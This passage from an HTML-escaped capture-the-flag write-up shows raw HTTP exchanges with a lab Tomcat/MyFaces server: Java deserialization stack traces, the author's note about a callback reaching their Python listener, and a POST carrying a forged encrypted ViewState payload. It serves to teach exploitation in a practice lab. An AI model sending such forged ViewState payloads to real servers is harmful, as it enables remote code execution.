class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-got-a-500-and-when-i-checked-my-python-server-i-saw-that-i-got-a-request-so-everything-is-fine&quot;&gt;I got a 500, and when I checked my python server I saw that I got a request so everything is fine.&lt;/h4&gt;
&lt;h4 id=&quot;2nd-request-&quot;&gt;2nd Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 3109
Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 2570
Date: Fri, 09 Aug 2019 18:38:50 GMT
Connection: close

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span 